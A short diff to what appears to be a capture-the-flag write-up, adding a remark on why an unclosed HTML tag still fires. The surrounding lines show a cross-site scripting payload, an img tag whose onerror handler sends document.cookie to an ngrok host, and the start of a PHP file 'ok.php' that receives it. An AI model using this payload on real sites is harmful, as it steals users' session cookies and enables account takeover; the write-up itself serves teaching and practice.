@@ -41,6 +41,8 @@ My solution :
 <img src=x onerror=javascript:document.location='http://37b0-41-225-85-6.ngrok.io/ok.php?c='+document.cookie;
 ```
 
+PS : the reason this works is because the browser will automatically try to fill in with the > tag 
+
 with ok.php :
 ```php
 <?php 
